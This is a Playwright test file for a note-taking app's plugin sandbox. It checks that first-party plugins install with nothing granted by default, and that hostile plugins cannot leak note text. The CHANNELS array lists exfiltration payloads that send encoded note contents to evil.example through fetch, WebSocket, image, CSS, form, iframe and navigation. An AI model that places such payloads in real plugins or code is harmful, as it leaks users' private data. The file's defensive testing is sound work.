import { test, expect, type Page } from "@playwright/test";

/**
 * Plan 11.2 — real, safe plugins, in the built app:
 *   - the 3 first-party plugins install from the registry (nothing granted
 *     until ticked) and run: a command + panel, a panel that edits the
 *     note, a code-block renderer;
 *   - a hostile plugin cannot get a byte out through any channel — fetch,
 *     WebSocket, image, CSS, form, iframe, navigation — one test each,
 *     with every request to the attacker's host counted at the network
 *     layer (must stay 0), plus the granted-network case under local-only.
 */

const EVIL = "https://evil.example";

async function boot(page: Page): Promise<{ evilRequests: string[] }> {
  const evilRequests: string[] = [];
  await page.route("**/*", (route) => {
    const u = route.request().url();
    if (u.startsWith(EVIL) || u.includes("evil.example")) {
      evilRequests.push(u);
      return route.fulfill({ status: 200, body: "{}" });
    }
    return route.fallback();
  });
  page.on("websocket", (ws) => {
    if (ws.url().includes("evil.example")) evilRequests.push(ws.url());
  });
  await page.addInitScript(() => {
    localStorage.setItem("lumen-tour-done", "1");
    localStorage.removeItem("lumen-md");
  });
  await page.goto("/");
  await expect(page.locator(".cm-content").first()).toContainText("Welcome to", { timeout: 15_000 });
  return { evilRequests };
}

const runCommand = (page: Page, id: string) => page.evaluate((cid) => window.dispatchEvent(new CustomEvent("lumen-run-command", { detail: { id: cid } })), id);

async function openGallery(page: Page) {
  await runCommand(page, "view.plugins");
  await expect(page.locator('[aria-labelledby="plugin-gallery-title"]')).toBeVisible();
}

async function installFromRegistry(page: Page, id: string) {
  const row = page.locator(`[data-plugin-row="${id}"]`);
  await row.locator('[data-testid="plugin-install"]').click();
  const consent = page.locator('[data-testid="plugin-consent"]');
  await expect(consent).toBeVisible();
  // Default deny: nothing ticked until the user ticks it.
  for (const box of await consent.locator("[data-capability]").all()) await expect(box).not.toBeChecked();
  for (const box of await consent.locator("[data-capability]").all()) await box.check();
  await consent.locator('[data-testid="plugin-consent-confirm"]').click();
  await expect(row).toHaveAttribute("data-installed", "true");
}

async function installFile(page: Page, manifest: Record<string, unknown>, main: string, tickAll = true) {
  const bundle = JSON.stringify({ format: "lumen-plugin/1", manifest: JSON.stringify(manifest), main });
  await page.locator('[data-testid="plugin-file-input"]').setInputFiles({ name: "p.lumenplugin.json", mimeType: "application/json", buffer: Buffer.from(bundle) });
  const consent = page.locator('[data-testid="plugin-consent"]');
  await expect(consent).toBeVisible();
  await expect(consent.getByRole("alert")).toBeVisible(); // unverified file
  if (tickAll) for (const box of await consent.locator("[data-capability]").all()) await box.check();
  await consent.locator('[data-testid="plugin-consent-confirm"]').click();
  await expect(page.locator(`[data-plugin-row="${manifest.id as string}"]`)).toHaveAttribute("data-installed", "true");
}

async function closeGallery(page: Page) {
  await page.keyboard.press("Escape");
  await expect(page.locator('[aria-labelledby="plugin-gallery-title"]')).toHaveCount(0);
}

test.describe("first-party plugins", () => {
  test("three plugins install with nothing granted by default, and run", async ({ page }) => {
    test.setTimeout(90_000);
    await boot(page);
    await openGallery(page);
    await expect(page.locator("[data-plugin-row]")).toHaveCount(3);
    for (const id of ["lumen.example.word-stats", "lumen.example.outline", "lumen.example.callout"]) await installFromRegistry(page, id);
    await closeGallery(page);

    // 1. Word stats: a palette command opens a panel with the numbers.
    const editor = page.locator(".cm-content").first();
    await editor.click();
    await editor.press("ControlOrMeta+a");
    await editor.fill("# כותרת ראשית\n\nשלום עולם, שלום לכולם.\n\n## Second\n\ntext\n");
    await expect.poll(async () => {
      await runCommand(page, "plugin:lumen.example.word-stats:show");
      return page.locator('[data-plugin-panel="lumen.example.word-stats"]').count();
    }, { timeout: 15_000 }).toBe(1);
    const stats = page.locator('[data-plugin-panel="lumen.example.word-stats"]');
    await expect(stats).toContainText("Words: 8");
    await expect(stats).toContainText("שלום — 2");

    // 2. Outline: its panel lists the headings and inserts a table of contents into the note.
    await runCommand(page, "plugin:lumen.example.outline:outline");
    const outline = page.locator('[data-plugin-panel="lumen.example.outline"]');
    await expect(outline).toContainText("כותרת ראשית");
    await expect(outline).toContainText("Second");
    await editor.click();
    await editor.press("ControlOrMeta+End");
    await outline.getByRole("button", { name: "Insert table of contents" }).click();
    await expect(editor).toContainText("- [[#כותרת ראשית]]");

    // 3. Callout cards: a ```callout block renders as the plugin's card in the preview.
    await page.keyboard.press("Meta+2");
    await editor.click();
    await editor.press("ControlOrMeta+a");
    await editor.fill("```callout\nלקנות\n- [ ] חלב\n- [x] לחם\n```\n");
    const card = page.locator('[data-plugin-block="callout"]').first();
    await expect(card).toContainText("לקנות", { timeout: 15_000 });
    await expect(card.getByRole("checkbox")).toHaveCount(2);
    await expect(card.getByRole("checkbox").nth(1)).toBeChecked();
  });
});

const hostileManifest = (id: string, extra: { id: string; reason: string }[] = []) => ({
  schema: 1,
  id,
  name: `Hostile ${id}`,
  version: "1.0.0",
  description: "tries to leak the note",
  author: "attacker",
  license: "MIT",
  main: "main.js",
  capabilities: [{ id: "document:read", reason: "read" }, { id: "panel", reason: "report" }, ...extra],
});

/** The plugin reads the note, tries `attempt` (which must reject or throw), and reports what happened in its panel. */
const hostile = (attempt: string) => `
const secret = await lumen.document.getText();
const enc = encodeURIComponent(secret.slice(0, 40));
let outcome;
try {
  await (async () => { ${attempt} })();
  outcome = "LEAKED";
} catch (e) {
  outcome = "blocked: " + (e && e.name) + " " + String(e && e.message).slice(0, 80);
}
await lumen.panel.open({ title: "report" });
await lumen.panel.render({ type: "text", text: "outcome=" + outcome });
`;

const CHANNELS: [string, string][] = [
  ["fetch", `if (typeof fetch === "function") await fetch("${EVIL}/f?d=" + enc); else await lumen.network.fetch("${EVIL}/f?d=" + enc);`],
  ["WebSocket", `if (typeof WebSocket === "function") { new WebSocket("wss://evil.example/ws?d=" + enc); return; } throw new ReferenceError("WebSocket is not defined");`],
  ["image", `await lumen.panel.open({}); await lumen.panel.render({ type: "img", src: "${EVIL}/i.png?d=" + enc });`],
  ["CSS", `await lumen.panel.open({}); await lumen.panel.render({ type: "text", text: "x", style: "background:url(${EVIL}/c.png?d=" + enc + ")" });`],
  ["form", `await lumen.panel.open({}); await lumen.panel.render({ type: "form", action: "${EVIL}/form", children: [{ type: "input", id: "d", value: secret }] });`],
  ["iframe", `await lumen.panel.open({}); await lumen.panel.render({ type: "iframe", src: "${EVIL}/frame?d=" + enc });`],
  ["navigation", `if (typeof location !== "undefined") { location.href = "${EVIL}/n?d=" + enc; return; } await lumen.panel.open({}); await lumen.panel.render({ type: "noteLink", target: "${EVIL}/n?d=" + enc });`],
];

test.describe("a hostile plugin cannot exfiltrate", () => {
  for (const [channel, attempt] of CHANNELS) {
    test(`channel: ${channel}`, async ({ page }) => {
      test.setTimeout(60_000);
      const { evilRequests } = await boot(page);
      const editor = page.locator(".cm-content").first();
      await editor.click();
      await editor.press("ControlOrMeta+a");
      await editor.fill("SECRET-סוד-12345\n");
      await openGallery(page);
      const id = `test.hostile.${channel.toLowerCase()}`;
      await installFile(page, hostileManifest(id), hostile(attempt));
      await closeGallery(page);
      const report = page.locator(`[data-plugin-panel="${id}"]`);
      await expect(report).toContainText("outcome=blocked", { timeout: 15_000 });
      await expect(report).not.toContainText("LEAKED");
      await page.waitForTimeout(500);
      expect(evilRequests).toEqual([]);
      await expect(page.locator(`img[src*="evil.example"], iframe[src*="evil.example"], form[action*="evil.example"]`)).toHaveCount(0);
    });
  }

  test("a granted origin is still blocked under local-only, and the ledger says so", async ({ page }) => {
    test.setTimeout(60_000);
    const { evilRequests } = await boot(page);
    await page.evaluate(() => localStorage.setItem("lumen.ai.policy", "local-only"));
    await openGallery(page);
    const id = "test.hostile.granted";
    await installFile(page, hostileManifest(id, [{ id: `network:${EVIL}`, reason: "send" }]), hostile(`await lumen.network.fetch("${EVIL}/g?d=" + enc);`));
    await closeGallery(page);
    await expect(page.locator(`[data-plugin-panel="${id}"]`)).toContainText("outcome=blocked: PluginDenied", { timeout: 15_000 });
    expect(evilRequests).toEqual([]);
    await runCommand(page, "ai.privacyLedger");
    const ledger = page.locator('[role="dialog"][aria-label="Privacy ledger"]');
    await expect(ledger.locator('[data-testid="privacy-row"][data-decision="blocked"]')).toContainText("evil.example");
  });
});
